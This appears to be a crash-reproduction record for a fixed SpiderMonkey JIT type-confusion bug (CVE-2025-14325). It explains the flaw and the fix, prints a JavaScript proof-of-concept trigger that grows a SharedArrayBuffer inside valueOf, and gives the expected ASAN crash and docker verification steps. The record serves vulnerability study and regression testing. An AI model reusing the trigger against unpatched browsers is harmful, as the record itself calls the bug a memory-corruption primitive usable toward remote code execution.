# Bugzilla 1998050 / CVE-2025-14325

**Title:** Baseline-JIT `AddSlot` type confusion on huge typed-array index with `valueOf` growth re-entrancy
**Severity:** sec-high (MFSA 2025-92, Firefox 146)
**Component:** SpiderMonkey — JIT — `js/src/jit/CacheIR.cpp` (`canAttachAddSlotStub`)
**Fix commit:** `49150a9a555a73e21dc20181c204b6003b17c167` (André Bargull, 2025-11-11, r=iain)
**Vulnerable revision:** `49150a9a555a73e21dc20181c204b6003b17c167~1`
**Reporter:** qriousec (AI-fuzzed). Public full-chain RCE writeup at
<https://qriousec.github.io/post/cve-2025-14325/>.

## Summary

`canAttachAddSlotStub` decides whether an IC should attach a slot-add
stub for `obj[prop] = value`. Pre-fix, the decision did not exclude
typed-array out-of-bounds indices — in particular, indices larger than
`2^32` on a `Uint8Array` backed by a growable `SharedArrayBuffer` or
resizable `ArrayBuffer`. The IC attached an `AddSlot` stub for what
was actually a typed-array indexed store.

The RHS `value`'s `valueOf` hook then called `sab.grow()` /
`ab.resize()` to extend the backing buffer. On re-entry, the IC
dispatched the `AddSlot` path against a `TypedArray` whose shape had
just been mutated by the `grow()` — the stub treated the typed-array
element slot as a regular `NativeObject` expando, yielding classic
JIT type confusion with a primitive for memory corruption (qriousec
demonstrated a full-chain RCE).

## Fix

The fix adds a typed-array index check at the entry of
`canAttachAddSlotStub`:

```cpp
// js/src/jit/CacheIR.cpp — canAttachAddSlotStub
bool SetPropIRGenerator::canAttachAddSlotStub(Handle<Shape*> oldShape) {
  if (obj_->is<TypedArrayObject>() /* or typed-array index check */) {
    return false;
  }
  // ... original logic
}
```

No `AddSlot` stub is attached on a typed-array indexed store path, so
the `valueOf` growth race can no longer transition a typed-array slot
through `AddSlot`.

## Trigger (`poc.js`)

Public jit-test `js/src/jit-test/tests/large-arraybuffers/bug1998050-1.js`:

```js
function test() {
  let sab = new SharedArrayBuffer(1, {maxByteLength: 0xffffffff + 0x20});
  const arr = new Uint8Array(sab);
  arr.abc = 1;
  const obj = {
    valueOf() {
      sab.grow(0xffffffff + 0x20)
    }
  };
  arr[0xffffffff + 9] = obj;
  assertEq(sab.byteLength, 0xffffffff + 0x20);
}
for (let i = 0; i < 20; i++) {
  test();
}
```

1. Creates a growable `SharedArrayBuffer` and wraps it in a `Uint8Array`.
2. Touches an expando property to warm the IC.
3. Stores `obj` at a huge OOB index (`0xffffffff + 9`) whose `valueOf`
   runs `sab.grow()` — triggering the miscompiled `AddSlot` path.

## Expected crash

ASAN **SEGV / MOZ_CRASH** at
`js::PropertyResult::propertyInfo()` (`/src/gecko-dev/js/src/vm/PropertyResult.h:66`)
inside `SetPropIRGenerator::tryAttachAddSlotStub`
(`CacheIR.cpp:5604`), dispatched from
`js::jit::DoSetPropFallback` (`BaselineIC.cpp:1539`).

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1998050 spidermonkey/1998050
bash spidermonkey/crash_check.sh 1998050
```

Expected: `CONFIMRED: ASAN_CRASH`.
